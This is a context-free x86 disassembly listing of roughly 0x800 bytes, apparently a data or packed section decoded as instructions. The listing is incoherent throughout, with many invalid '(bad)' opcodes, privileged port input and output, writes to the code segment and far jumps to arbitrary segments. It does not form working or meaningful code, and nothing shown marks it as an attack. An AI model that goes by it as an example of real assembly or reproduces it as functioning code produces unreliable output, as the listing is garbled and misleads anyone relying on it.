  413e0c:	mov    DWORD PTR [ebp+0x7],eax
  413e0f:	mov    al,0xaa
  413e11:	loopne 0x413dd1
  413e13:	cmc    
  413e14:	in     al,0x72
  413e16:	rol    ebp,1
  413e18:	data16 adc BYTE PTR [esi-0x1c],dh
  413e1c:	cmp    BYTE PTR [ebx+ebp*1],bh
  413e1f:	add    DWORD PTR [ebx],edx
  413e21:	cdq    
  413e22:	and    esi,DWORD PTR [ebx]
  413e24:	call   0xe516:0x3009e2ab
  413e2b:	int3   
  413e2c:	nop
  413e2d:	pop    ecx
  413e2e:	and    eax,0x3954ffc7
  413e33:	push   esp
  413e34:	out    0xed,eax
  413e36:	add    ah,BYTE PTR [ebp+0x7f]
  413e39:	sbb    ebp,esi
  413e3b:	dec    ecx
  413e3c:	inc    esp
  413e3d:	xchg   esi,eax
  413e3e:	adc    edx,edx
  413e40:	adc    al,0xb3
  413e42:	inc    esp
  413e43:	loop   0x413dce
  413e45:	stc    
  413e46:	push   ebp
  413e47:	mov    dh,BYTE PTR [esi-0x6880e981]
  413e4d:	lock jp 0x413e32
  413e50:	popf   
  413e51:	dec    eax
  413e52:	push   ds
  413e53:	mov    ds:0xf014d4d0,eax
  413e58:	shl    cl,0xd6
  413e5b:	cmp    al,0x2b
  413e5d:	mov    bl,0x47
  413e5f:	arpl   WORD PTR [edx+0x206aecfc],sp
  413e65:	jmp    0x548d:0x8789c105
  413e6c:	cmp    dh,BYTE PTR [esi-0x55]
  413e6f:	add    esp,DWORD PTR [edi+0x62]
  413e72:	aad    0xd8
  413e74:	and    eax,DWORD PTR [edx-0x41bd547f]
  413e7a:	or     DWORD PTR fs:[ecx+edx*8+0x71],ecx
  413e7f:	out    dx,eax
  413e80:	ins    DWORD PTR es:[edi],dx
  413e81:	mov    WORD PTR [edi],es
  413e83:	pop    ecx
  413e84:	test   al,0xca
  413e86:	outs   dx,DWORD PTR ds:[esi]
  413e87:	push   ebp
  413e88:	xor    ch,BYTE PTR [ebx+ebx*8+0x39bd56ef]
  413e8f:	aas    
  413e90:	xchg   ebp,eax
  413e91:	push   es
  413e92:	jge    0x413e5a
  413e94:	rol    BYTE PTR [edi+0x4ca6e240],cl
  413e9a:	inc    ecx
  413e9b:	pop    ebp
  413e9c:	out    0x87,eax
  413e9e:	push   ss
  413e9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ea0:	push   0xffffffce
  413ea2:	jne    0x413ece
  413ea4:	std    
  413ea5:	mov    bh,0xa2
  413ea7:	xor    BYTE PTR [edx-0x4c],cl
  413eaa:	jmp    0x2f99:0xf146bda3
  413eb1:	xchg   ecx,eax
  413eb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eb3:	pop    ebx
  413eb4:	dec    ecx
  413eb5:	test   ax,0xcdc4
  413eb9:	push   ecx
  413eba:	lock clc 
  413ebc:	add    ebx,DWORD PTR [edi-0x76]
  413ebf:	push   ecx
  413ec0:	dec    esi
  413ec1:	add    dh,BYTE PTR [edi+0x55c46528]
  413ec7:	pop    ds
  413ec8:	std    
  413ec9:	std    
  413eca:	sub    edx,DWORD PTR [esi-0x10706065]
  413ed0:	ret    
  413ed1:	jae    0x413ee3
  413ed3:	jl     0x413eae
  413ed5:	not    DWORD PTR [eax-0x2fe5ea71]
  413edb:	test   eax,0xb6e17021
  413ee0:	jne    0x413f53
  413ee2:	mov    BYTE PTR [eax],bl
  413ee4:	and    esp,edx
  413ee6:	pop    esp
  413ee7:	int    0x4c
  413ee9:	add    bh,BYTE PTR [ecx-0x3e]
  413eec:	dec    esp
  413eed:	xor    cl,BYTE PTR ds:0xf4b4b3b8
  413ef3:	mov    esi,0x626f5465
  413ef8:	jnp    0x413ee7
  413efa:	push   esp
  413efb:	test   al,0xc7
  413efd:	and    DWORD PTR [ebp+0x5b0a3b8a],0xf6939681
  413f07:	sub    esi,ecx
  413f09:	ss pop eax
  413f0b:	sub    eax,0xf12cad2
  413f10:	xchg   esi,eax
  413f11:	fdivr  DWORD PTR [edi+0x759ed05b]
  413f17:	imul   esi,DWORD PTR [eax*8-0x5cebf14c],0x20
  413f1f:	fnstsw WORD PTR [edi+ebp*8]
  413f22:	inc    ebx
  413f23:	xchg   esi,eax
  413f24:	sbb    al,0x9e
  413f26:	cmp    eax,DWORD PTR [edi+0x323602e]
  413f2c:	mov    esi,0xfed0668e
  413f31:	retf   
  413f32:	test   ebx,esi
  413f34:	ret    
  413f35:	dec    edi
  413f36:	not    BYTE PTR ds:[edi+0xb]
  413f3a:	or     eax,0x39638e47
  413f3f:	mov    ss,WORD PTR [esi+0x190557a2]
  413f45:	pop    eax
  413f46:	mov    ds:0xbbf94640,eax
  413f4b:	and    al,0x6
  413f4d:	imul   al
  413f4f:	outs   dx,BYTE PTR ds:[esi]
  413f50:	in     eax,0xcf
  413f52:	jne    0x413f18
  413f54:	or     bl,al
  413f56:	sub    ah,BYTE PTR [eax-0x3d383224]
  413f5c:	repz shr esi,cl
  413f5f:	mov    WORD PTR [esi],es
  413f61:	call   0x594d55e8
  413f66:	fadd   QWORD PTR [edi+0x32adf277]
  413f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f6d:	xchg   ecx,eax
  413f6e:	sbb    al,0xd7
  413f70:	fs mov dl,0x7c
  413f73:	dec    ebx
  413f74:	pop    ebx
  413f75:	add    BYTE PTR [edx+0x29],0xf0
  413f79:	push   edi
  413f7a:	fisttp QWORD PTR [edi]
  413f7c:	push   0x3a
  413f7e:	cdq    
  413f7f:	push   ss
  413f80:	iret   
  413f81:	loope  0x413f50
  413f83:	nop
  413f84:	lahf   
  413f85:	cld    
  413f86:	adc    BYTE PTR [esi-0xca950d6],bh
  413f8c:	jne    0x41400b
  413f8e:	mov    dl,0xdf
  413f90:	push   ebp
  413f91:	enter  0xc0c0,0x1c
  413f95:	out    0x73,al
  413f97:	cmp    eax,0x2659b9b9
  413f9c:	ds loopne 0x41400c
  413f9f:	ret    0x7f8b
  413fa2:	out    0xa3,eax
  413fa4:	adc    ebp,esp
  413fa6:	add    eax,0xff239dc0
  413fab:	in     al,0x21
  413fad:	mov    ds:0x7284fec4,al
  413fb2:	mov    cs,eax
  413fb4:	xchg   edx,eax
  413fb5:	pop    esp
  413fb6:	repz xor edi,DWORD PTR [esp+ebp*4+0x67]
  413fbb:	inc    DWORD PTR [edi]
  413fbd:	loope  0x413fb5
  413fbf:	sbb    DWORD PTR [ebx-0x4b],esp
  413fc2:	mov    ch,0x9
  413fc4:	in     eax,dx
  413fc5:	loope  0x413fa6
  413fc7:	sbb    al,0x81
  413fc9:	js     0x413f7c
  413fcb:	cld    
  413fcc:	mov    ch,0x14
  413fce:	into   
  413fcf:	jae    0x41400a
  413fd1:	loope  0x413f6a
  413fd3:	clc    
  413fd4:	jb     0x413f91
  413fd6:	dec    ecx
  413fd7:	xchg   ebx,eax
  413fd8:	cs ss inc esp
  413fdb:	xchg   ecx,eax
  413fdc:	cld    
  413fdd:	push   ds
  413fde:	and    ecx,DWORD PTR [edi+0x1a]
  413fe1:	clc    
  413fe2:	lea    ebx,[esi+0x3d]
  413fe5:	(bad)  
  413fe6:	(bad)  
  413fe7:	es scas al,BYTE PTR es:[edi]
  413fe9:	stc    
  413fea:	xchg   BYTE PTR [esi],ah
  413fec:	push   ss
  413fed:	jg     0x41403d
  413fef:	call   DWORD PTR [edx-0x80]
  413ff2:	call   FWORD PTR ds:0x4cddb333
  413ff8:	adc    bh,ch
  413ffa:	aad    0xdb
  413ffc:	scas   eax,DWORD PTR es:[edi]
  413ffd:	pop    esi
  413ffe:	mov    dl,0x75
  414000:	pop    ebp
  414001:	jo     0x414040
  414003:	pop    eax
  414004:	sub    eax,esp
  414006:	ins    DWORD PTR es:[edi],dx
  414007:	pop    ds
  414008:	test   eax,0x609f1b57
  41400d:	test   BYTE PTR [ecx+0x7f],0x9d
  414011:	push   edx
  414012:	gs or  bh,al
  414015:	dec    esi
  414016:	pop    es
  414017:	xchg   dl,dl
  414019:	cdq    
  41401a:	fmulp  st(7),st
  41401c:	mov    dh,0xa2
  41401e:	pop    ebp
  41401f:	xor    eax,0xc8bc0dad
  414024:	cmp    al,0xf1
  414026:	arpl   ax,sp
  414028:	jle    0x414084
  41402a:	push   eax
  41402b:	inc    edi
  41402c:	xor    bl,BYTE PTR [edi]
  41402e:	fcom   DWORD PTR [ecx-0x72d60f29]
  414034:	mov    dl,0x57
  414036:	and    al,0xed
  414038:	or     BYTE PTR [edx+0x45],ch
  41403b:	aad    0xad
  41403d:	retf   
  41403e:	mov    esi,0x9f9c0b5
  414043:	xor    dl,BYTE PTR [esi+esi*4-0x20]
  414047:	aam    0x43
  414049:	sub    ebp,edx
  41404b:	rol    DWORD PTR [eax+edx*4-0x53972e64],cl
  414052:	cmc    
  414053:	clc    
  414054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414055:	push   es
  414056:	das    
  414057:	scas   eax,DWORD PTR es:[edi]
  414058:	and    al,0xc9
  41405a:	or     BYTE PTR [ecx],ah
  41405c:	iret   
  41405d:	int    0xcc
  41405f:	push   ds
  414060:	xchg   ecx,eax
  414061:	cdq    
  414062:	xchg   esp,eax
  414063:	mov    ds:0x9807132b,eax
  414068:	push   eax
  414069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41406a:	lock cmc 
  41406c:	retf   
  41406d:	and    DWORD PTR [eax-0x67921363],0x18
  414074:	push   ebx
  414075:	stos   BYTE PTR es:[edi],al
  414076:	sbb    ah,BYTE PTR [edi-0x21]
  414079:	inc    edx
  41407a:	shl    bh,0x36
  41407d:	(bad)  
  41407e:	mov    bl,0xeb
  414080:	xchg   ah,al
  414082:	push   esi
  414083:	add    al,0x88
  414085:	mov    edx,0x9183db9f
  41408a:	xchg   esi,eax
  41408b:	dec    ebx
  41408c:	ficomp DWORD PTR [esi-0x784675f]
  414092:	mov    ds:0xf27bd9f1,al
  414097:	add    DWORD PTR [edi+0x72],0x944db151
  41409e:	cwde   
  41409f:	push   esp
  4140a0:	pop    ebp
  4140a1:	adc    dl,BYTE PTR [esi-0x5910ea59]
  4140a7:	sub    ebx,DWORD PTR [eax+0x70]
  4140aa:	cmp    eax,0x7b9bb437
  4140af:	mov    eax,ds:0xb1309e88
  4140b4:	icebp  
  4140b5:	xchg   BYTE PTR [ebp-0x6d],dh
  4140b8:	stos   DWORD PTR es:[edi],eax
  4140b9:	jp     0x414111
  4140bb:	dec    ecx
  4140bc:	call   0xbdfa:0x44a08f3c
  4140c3:	or     bh,bh
  4140c5:	xchg   edx,eax
  4140c6:	xchg   ebx,eax
  4140c7:	push   ss
  4140c8:	and    esp,DWORD PTR [edx-0x2d]
  4140cb:	clc    
  4140cc:	dec    edx
  4140cd:	mov    esi,DWORD PTR [edx]
  4140cf:	mov    ch,0x4d
  4140d1:	(bad)  
  4140d2:	mov    cl,0x66
  4140d4:	out    0x42,al
  4140d6:	adc    BYTE PTR [eax+eax*2],cl
  4140d9:	mov    BYTE PTR ds:0xb4ec8ddf,0xa0
  4140e0:	dec    ebx
  4140e1:	iret   
  4140e2:	ficomp WORD PTR [edx]
  4140e4:	sbb    BYTE PTR [ecx-0x83ecaf7],al
  4140ea:	enter  0x68ae,0xb4
  4140ee:	or     BYTE PTR [edx+0x57],0xb9
  4140f2:	mov    bl,0x92
  4140f4:	pop    ecx
  4140f5:	mov    ds:0xd68dd7f7,al
  4140fa:	das    
  4140fb:	jl     0x4140a2
  4140fd:	xlat   BYTE PTR ds:[ebx]
  4140fe:	pop    ds
  4140ff:	xchg   esp,eax
  414100:	cmp    al,0x38
  414102:	jle    0x4140c8
  414104:	mov    bl,0x14
  414106:	ins    BYTE PTR es:[edi],dx
  414107:	adc    BYTE PTR [edx+0x1f131ddf],bh
  41410d:	popa   
  41410e:	rcr    ebx,1
  414110:	jl     0x414189
  414112:	pop    esi
  414113:	mov    dl,0x8f
  414115:	jle    0x41411b
  414117:	cdq    
  414118:	add    DWORD PTR [edx+0x1],edi
  41411b:	lea    ebp,[edi+0x65a1b9ec]
  414121:	jmp    0x41418f
  414123:	ins    DWORD PTR es:[edi],dx
  414124:	add    al,0x4e
  414126:	out    0x80,al
  414128:	outs   dx,BYTE PTR ds:[esi]
  414129:	push   edx
  41412a:	or     eax,0x135417f9
  41412f:	cmp    eax,DWORD PTR [ebx+0x1b]
  414132:	add    eax,0x8cb7943d
  414137:	lahf   
  414138:	cmc    
  414139:	adc    eax,0x3e7edd44
  41413e:	adc    al,0x77
  414140:	std    
  414141:	sahf   
  414142:	mov    ebx,0x55fe5a44
  414147:	aas    
  414148:	sub    ecx,DWORD PTR [edi-0x12987d60]
  41414e:	xchg   ebp,eax
  41414f:	dec    esp
  414150:	jp     0x414135
  414152:	cmp    eax,0x9f121758
  414157:	xor    bl,al
  414159:	shl    BYTE PTR [ebp+0x18],0xdb
  41415d:	or     al,0xb1
  41415f:	mov    eax,0xce568a5d
  414164:	shl    BYTE PTR ds:0x7a682de6,1
  41416b:	mov    ds:0xf12208dd,al
  414170:	pop    ecx
  414171:	ins    DWORD PTR es:[edi],dx
  414172:	add    eax,edi
  414174:	and    dh,BYTE PTR [ebx]
  414176:	adc    eax,0x190c972b
  41417b:	add    BYTE PTR [ecx+0x2b],ah
  41417e:	xchg   BYTE PTR [ebx+0x4],cl
  414181:	pop    ebx
  414182:	rol    BYTE PTR [esi],cl
  414184:	imul   esi,DWORD PTR [ebp+0x4d],0x7fee1d50
  41418b:	aas    
  41418c:	mov    ah,0x11
  41418e:	div    BYTE PTR [eax+0x6e85d471]
  414194:	pop    esi
  414195:	jp     0x41418a
  414197:	aas    
  414198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414199:	sar    BYTE PTR [edi+0x74ab43f6],0xfc
  4141a0:	(bad)  
  4141a2:	in     al,dx
  4141a3:	(bad)  
  4141a4:	sbb    eax,0x1f3be219
  4141a9:	lahf   
  4141aa:	jb     0x4141f4
  4141ac:	loop   0x4141d2
  4141ae:	into   
  4141af:	cmp    al,0x2d
  4141b1:	cmp    cl,cl
  4141b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141b4:	hlt    
  4141b5:	nop
  4141b6:	push   0xffffffbf
  4141b8:	ss mov esp,0x89735ded
  4141be:	adc    esp,ebp
  4141c0:	mov    cl,0x61
  4141c2:	mov    ds:0x6fecb297,al
  4141c7:	mov    bl,0xb1
  4141c9:	jnp    0x414247
  4141cb:	xor    eax,0x6bb71ad9
  4141d0:	call   0x24bfe620
  4141d5:	test   BYTE PTR [esi-0x6d],ch
  4141d8:	sub    al,0x36
  4141db:	mov    ebp,0xece149c
  4141e0:	repz leave 
  4141e2:	fstp   DWORD PTR [eax]
  4141e4:	test   ebx,ebp
  4141e6:	arpl   bp,si
  4141e8:	sbb    al,0xcb
  4141ea:	inc    ecx
  4141eb:	jmp    0x4141e5
  4141ed:	rol    eax,cl
  4141ef:	test   DWORD PTR [edx-0x63026004],0x8ff4a2e0
  4141f9:	pop    eax
  4141fa:	pop    esp
  4141fb:	pop    edx
  4141fc:	mov    WORD PTR [edi],cs
  4141fe:	stos   BYTE PTR es:[edi],al
  4141ff:	xor    DWORD PTR [edx+0x3c7e8a0b],esi
  414205:	push   cs
  414206:	arpl   WORD PTR [esi-0x17dafa41],dx
  41420c:	mov    ah,0xb6
  41420e:	hlt    
  41420f:	xchg   ebp,eax
  414210:	out    0xe3,eax
  414212:	xor    DWORD PTR [edi+ecx*4-0x271a6e56],0x20
  41421a:	lods   eax,DWORD PTR ds:[esi]
  41421b:	xor    eax,0xb70ef060
  414220:	sbb    DWORD PTR [eax-0x352c72f8],edx
  414226:	mov    dh,0x64
  414228:	test   BYTE PTR [edi],bl
  41422a:	mov    ebp,0x450e75cf
  41422f:	jno    0x414242
  414231:	jnp    0x4141e9
  414233:	call   0x7a38cb24
  414238:	test   BYTE PTR [ecx+0x64],bh
  41423b:	dec    eax
  41423c:	mov    bh,0x77
  41423e:	jne    0x414250
  414240:	jge    0x4141e2
  414242:	stc    
  414243:	push   eax
  414244:	push   0xda4c59c8
  414249:	pop    eax
  41424a:	ins    BYTE PTR es:[edi],dx
  41424b:	or     bl,BYTE PTR [edi-0x191cca32]
  414251:	xchg   ecx,eax
  414252:	add    ebx,DWORD PTR [ebx]
  414254:	jle    0x414201
  414256:	jl     0x4142d7
  414258:	pop    ss
  414259:	pushf  
  41425a:	pop    edx
  41425b:	pop    ecx
  41425c:	add    bh,0xfb
  41425f:	adc    BYTE PTR [ecx],cl
  414261:	mov    ds:0xc757d859,eax
  414266:	dec    DWORD PTR [edi+eiz*2+0x14]
  41426a:	cmc    
  41426b:	lods   eax,DWORD PTR ds:[esi]
  41426c:	sahf   
  41426d:	jp     0x41427e
  41426f:	ret    
  414270:	cwde   
  414271:	aas    
  414272:	scas   eax,DWORD PTR es:[edi]
  414273:	cmc    
  414274:	lods   al,BYTE PTR ds:[esi]
  414275:	pop    ss
  414276:	mov    al,ah
  414278:	(bad)  
  414279:	jnp    0x4142ce
  41427b:	push   0xfffffff6
  41427d:	pop    eax
  41427e:	ret    0x6dce
  414281:	bound  edi,QWORD PTR [esp]
  414284:	dec    ebp
  414285:	jno    0x4142c7
  414287:	cmp    ecx,edx
  414289:	and    BYTE PTR [esp+ecx*2+0x7c2aa00],ah
  414290:	push   ds
  414291:	cs sbb eax,0xb40b48b5
  414297:	scas   al,BYTE PTR es:[edi]
  414298:	jo     0x4142be
  41429a:	xor    eax,0xcd8f3d76
  41429f:	push   0xc1578c3
  4142a4:	sbb    ebp,esi
  4142a6:	inc    eax
  4142a7:	dec    DWORD PTR [esi]
  4142a9:	aad    0x92
  4142ab:	fs in  al,dx
  4142ad:	das    
  4142ae:	fs pop esp
  4142b0:	pop    ds
  4142b1:	mov    BYTE PTR [edx+edx*4-0x55],0x4d
  4142b6:	ins    DWORD PTR es:[edi],dx
  4142b7:	push   ss
  4142b8:	lods   al,BYTE PTR ds:[esi]
  4142b9:	loopne 0x4142b1
  4142bb:	mov    WORD PTR [edx-0x6186fbc2],es
  4142c1:	push   ss
  4142c2:	xchg   ecx,eax
  4142c3:	inc    edi
  4142c4:	(bad)  
  4142c5:	(bad)  
  4142c6:	mov    gs,WORD PTR [ebx+0x1b1abb75]
  4142cc:	(bad)  
  4142cd:	dec    esp
  4142ce:	outs   dx,BYTE PTR ds:[esi]
  4142cf:	mov    ebp,cr6
  4142d2:	sbb    ebx,edi
  4142d4:	in     eax,0xbd
  4142d6:	out    dx,eax
  4142d7:	cli    
  4142d8:	sbb    eax,0x6dbc5201
  4142dd:	lods   eax,DWORD PTR ds:[esi]
  4142de:	fist   WORD PTR [eax]
  4142e0:	add    bh,BYTE PTR [eax]
  4142e2:	pop    edx
  4142e3:	enter  0x8664,0xeb
  4142e7:	std    
  4142e8:	popf   
  4142e9:	dec    ecx
  4142ea:	imul   edi,edx,0x9d5cebe5
  4142f0:	xor    edx,DWORD PTR [eax+0xc]
  4142f3:	mov    edx,0x6276d16e
  4142f8:	stos   DWORD PTR es:[edi],eax
  4142f9:	sub    eax,0x644fa29
  4142fe:	pop    ss
  4142ff:	jg     0x414361
  414301:	push   0x5b
  414303:	mov    edi,0xfbdc6ae3
  414308:	adc    eax,0xbd076bb7
  41430d:	or     bh,BYTE PTR [ebx]
  41430f:	out    dx,eax
  414310:	xchg   ebp,eax
  414311:	mov    ds:0x4f85e98,eax
  414316:	cdq    
  414317:	(bad)  
  414318:	aad    0x37
  41431a:	inc    edi
  41431b:	inc    ebp
  41431c:	mov    ?,WORD PTR [esi]
  41431e:	(bad)  
  41431f:	xor    BYTE PTR [ecx-0x3a],cl
  414322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414323:	jae    0x414316
  414325:	mov    eax,ds:0xf1a8982a
  41432a:	fwait
  41432b:	ins    BYTE PTR es:[edi],dx
  41432c:	leave  
  41432d:	push   ss
  41432e:	nop
  41432f:	inc    edi
  414330:	out    dx,al
  414331:	jecxz  0x414376
  414333:	adc    esp,DWORD PTR [esi-0x5fc9da1a]
  414339:	mov    WORD PTR ss:[esi-0x78],es
  41433d:	out    0x80,eax
  41433f:	arpl   WORD PTR [eax+0x56331343],dx
  414345:	imul   esp,DWORD PTR [edi+edx*8-0x2453c5cf],0x93bbc241
  414350:	sub    eax,0xf12a7238
  414355:	or     bh,bh
  414357:	pop    ebx
  414358:	or     DWORD PTR [edi],eax
  41435a:	or     DWORD PTR ds:0x65ad5d33,edx
  414360:	lods   al,BYTE PTR ds:[esi]
  414361:	push   es
  414362:	pop    ds
  414363:	and    DWORD PTR [eax+0x31],esi
  414366:	sub    ecx,DWORD PTR [ebx-0x1c]
  414369:	es push edi
  41436b:	in     al,0xf7
  41436d:	fcmove st,st(6)
  41436f:	xchg   ecx,eax
  414370:	(bad)  
  414372:	mov    al,ds:0x4bf1b7f3
  414377:	enter  0xed25,0xc7
  41437b:	out    0x8b,al
  41437d:	aaa    
  41437e:	addr16 and eax,0x10e4b1ee
  414384:	mov    dh,0x50
  414386:	bound  esi,QWORD PTR [eax-0x20525a8]
  41438c:	mov    DWORD PTR [eax-0x333b4aeb],ecx
  414392:	push   ebp
  414393:	imul   eax,DWORD PTR [edx-0x5ef71626],0x71d72d9f
  41439d:	mov    bl,0xd2
  41439f:	aad    0xef
  4143a1:	into   
  4143a2:	or     BYTE PTR [ebp-0x6bb330da],ah
  4143a8:	nop
  4143a9:	cmp    bh,BYTE PTR [esi-0xd]
  4143ac:	loop   0x41440f
  4143ae:	in     al,0xe6
  4143b0:	div    cl
  4143b2:	xchg   edi,eax
  4143b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143b4:	xor    BYTE PTR [edx-0x60],dl
  4143b7:	pop    esp
  4143b8:	ins    BYTE PTR es:[edi],dx
  4143b9:	adc    BYTE PTR [ecx+edi*8+0x6e99636d],bh
  4143c0:	repnz mov eax,0x6eea67c2
  4143c6:	cs mov esp,0xa0fc0459
  4143cc:	and    DWORD PTR ss:[eax+0x68],0x8b00e71b
  4143d4:	imul   eax,DWORD PTR [eax+0x7b],0x5a
  4143d8:	into   
  4143d9:	in     al,0x4e
  4143db:	pop    eax
  4143dc:	aam    0x2a
  4143de:	push   0x7e
  4143e0:	ins    DWORD PTR es:[edi],dx
  4143e1:	mov    eax,ds:0x15f0e3e9
  4143e6:	lods   eax,DWORD PTR ds:[esi]
  4143e7:	(bad)  
  4143e8:	or     ebp,esi
  4143ea:	stc    
  4143eb:	mov    ds:0xab32c539,eax
  4143f0:	add    DWORD PTR [ebx-0x3d],ebx
  4143f3:	mov    al,ds:0x47bdbd26
  4143f8:	mov    eax,0x7e71bae6
  4143fd:	mov    dh,0xee
  4143ff:	aam    0x26
  414401:	mov    edx,0x4ef9c6ba
  414406:	cmp    cl,BYTE PTR es:[edx-0x78b61af9]
  41440d:	cmp    eax,0x6939e5c7
  414413:	mov    ds:0x3a511bc1,al
  414418:	adc    esi,ebx
  41441a:	(bad)  
  41441b:	sahf   
  41441c:	fcomp  st(6)
  41441e:	jmp    0x41440d
  414420:	push   ecx
  414421:	xlat   BYTE PTR ds:[ebx]
  414422:	ins    BYTE PTR es:[edi],dx
  414423:	inc    ecx
  414424:	repnz inc ebp
  414426:	fist   WORD PTR [ebx+0x6d]
  414429:	sbb    DWORD PTR [edi+0x78ac602d],0xdeccb2f9
  414433:	(bad)  
  414434:	cmp    BYTE PTR [edx+edx*1-0x4],al
  414438:	push   ss
  414439:	std    
  41443a:	xchg   ebp,eax
  41443b:	or     al,0x22
  41443d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41443e:	imul   ebx,DWORD PTR fs:[esp+edx*2+0x37423e53],0xfffffff2
  414447:	fcomp  QWORD PTR [edx-0x49d1a802]
  41444d:	sub    esi,DWORD PTR [eax+0x0]
  414450:	sub    DWORD PTR [ecx-0x3ccdacae],ebx
  414456:	add    al,0xdf
  414458:	push   esp
  414459:	xor    eax,0x32da8852
  41445e:	(bad)  
  41445f:	(bad)  
  414461:	jmp    0x2d7e06a8
  414466:	adc    eax,0x6f81224f
  41446b:	stc    
  41446c:	xor    ch,BYTE PTR [ecx-0x41]
  41446f:	in     eax,0x38
  414471:	push   0x547e4ec6
  414476:	cwde   
  414477:	out    dx,al
  414478:	stos   BYTE PTR es:[edi],al
  414479:	push   cs
  41447a:	push   ebx
  41447b:	ret    0xd79c
  41447e:	or     BYTE PTR [ecx+0x29ddd6cc],dh
  414484:	ror    BYTE PTR ds:0xced7d321,0x15
  41448b:	jle    0x41448d
  41448d:	cmp    ch,0x33
  414490:	sub    al,0xe8
  414492:	cmc    
  414493:	scas   al,BYTE PTR es:[edi]
  414494:	jnp    0x414498
  414496:	adc    edx,DWORD PTR [ecx+esi*8]
  414499:	mov    eax,0xddb3008a
  41449e:	pop    esp
  41449f:	das    
  4144a0:	cmp    BYTE PTR [edx+0x47],0xc2
  4144a4:	stos   BYTE PTR es:[edi],al
  4144a5:	lods   al,BYTE PTR ds:[esi]
  4144a6:	mov    edx,0x2aae1a7f
  4144ab:	loop   0x414524
  4144ad:	loopne 0x41447b
  4144af:	xor    al,dh
  4144b1:	pop    esp
  4144b2:	sbb    BYTE PTR [ebx+0x43],dl
  4144b5:	sbb    bl,BYTE PTR [edi+0xb]
  4144b8:	mov    DWORD PTR [edi+edi*1+0x7a],esi
  4144bc:	icebp  
  4144bd:	ret    0xdabc
  4144c0:	nop
  4144c1:	pushf  
  4144c2:	lods   al,BYTE PTR ds:[esi]
  4144c3:	mov    edx,0xe9655b20
  4144c8:	jo     0x41448b
  4144ca:	xchg   ebx,eax
  4144cb:	xor    edx,0xc4aefed
  4144d1:	cmc    
  4144d2:	mov    cs,WORD PTR [eax+0xe]
  4144d5:	and    DWORD PTR [esi-0xc],eax
  4144d8:	jg     0x41448b
  4144da:	pusha  
  4144db:	test   eax,0xd6863a6c
  4144e0:	sub    bh,BYTE PTR ds:0xce0e68c7
  4144e6:	call   0x190ccac5
  4144eb:	xchg   ebp,eax
  4144ec:	sbb    DWORD PTR [ebp+0x2f],0xb
  4144f0:	push   es
  4144f1:	loopne 0x414498
  4144f3:	dec    esi
  4144f4:	and    al,ch
  4144f6:	(bad)  
  4144f7:	hlt    
  4144f8:	add    dh,BYTE PTR [ebp+0x57e5d344]
  4144fe:	pushf  
  4144ff:	(bad)  
  414500:	mov    eax,ds:0x657e4332
  414505:	mov    ch,ah
  414507:	mov    edi,0xdf772763
  41450c:	or     BYTE PTR [edi],bh
  41450e:	sar    DWORD PTR ds:0xa87b3dd1,cl
  414514:	jl     0x414573
  414516:	xchg   ecx,eax
  414517:	cmp    BYTE PTR [edi+0x4328a462],ch
  41451d:	imul   ecx,DWORD PTR [ebx+0x67],0xffffffd2
  414521:	push   eax
  414522:	mov    eax,ds:0xf81afb4b
  414527:	stos   BYTE PTR es:[edi],al
  414528:	dec    ebp
  414529:	test   DWORD PTR [edx-0x785b78bc],ecx
  41452f:	sub    cl,dl
  414531:	xor    eax,0x830f26a9
  414536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414537:	test   eax,0x5b63faf9
  41453c:	push   eax
  41453d:	sub    eax,DWORD PTR [ebp-0x2f]
  414540:	imul   DWORD PTR ds:0xca3d6972
  414546:	stos   DWORD PTR es:[edi],eax
  414547:	pusha  
  414548:	jl     0x4144d3
  41454a:	and    BYTE PTR [edx+0x6df4c372],0x5e
  414551:	retf   
  414552:	sti    
  414553:	rcr    DWORD PTR [ebx-0x51],cl
  414556:	jle    0x414502
  414558:	dec    eax
  414559:	or     ebp,DWORD PTR [esi+ecx*2-0x11]
  41455d:	sub    eax,0x2f38b88c
  414562:	add    eax,0xb557f405
  414567:	ins    BYTE PTR es:[edi],dx
  414568:	mov    edx,0xb65a7cd4
  41456d:	add    ecx,DWORD PTR [ebp-0x3691047d]
  414573:	in     al,0x17
  414575:	inc    eax
  414576:	push   ebx
  414577:	or     cl,BYTE PTR [edx-0x353c549b]
  41457d:	js     0x414518
  41457f:	out    0x40,al
  414581:	inc    esi
  414582:	add    ch,BYTE PTR [ebx-0x3d]
  414585:	in     al,0x21
  414587:	hlt    
  414588:	sbb    DWORD PTR [eiz*8-0x42f5cc9b],ebp
  41458f:	aas    
  414590:	pop    edi
  414591:	sbb    al,0x44
  414593:	xchg   ch,dh
  414595:	pop    es
  414596:	out    dx,al
  414597:	jnp    0x4145ab
  414599:	aaa    
  41459a:	jb     0x41459f
  41459c:	in     al,dx
  41459d:	pop    ecx
  41459e:	movntps XMMWORD PTR [esi],xmm4
  4145a1:	fidivr DWORD PTR [esi-0x46]
  4145a4:	stos   DWORD PTR es:[edi],eax
  4145a5:	cmp    eax,0x7ff61e57
  4145aa:	in     al,0x59
  4145ac:	out    0xe0,eax
  4145ae:	push   edx
  4145af:	bsr    ecx,DWORD PTR [edx]
  4145b2:	retf   
  4145b3:	push   edx
  4145b4:	pop    es
  4145b5:	pop    edi
  4145b6:	outs   dx,DWORD PTR ds:[esi]
  4145b7:	gs in  al,0x21
  4145ba:	std    
  4145bb:	add    esi,esp
  4145bd:	cmp    eax,0xb5054dd9
  4145c2:	cs inc esp
  4145c4:	cdq    
  4145c5:	jg     0x414625
  4145c7:	cmp    al,0xb0
  4145c9:	add    esi,esp
  4145cb:	dec    esp
  4145cc:	mov    DWORD PTR ds:0x829bf71f,eax
  4145d2:	ror    DWORD PTR [edi+0x332ae4bb],cl
  4145d8:	test   DWORD PTR [edi-0x50],eax
  4145db:	(bad)  
  4145dc:	cmp    bl,BYTE PTR [ebx+0x3a]
  4145df:	push   eax
  4145e0:	loop   0x4145a2
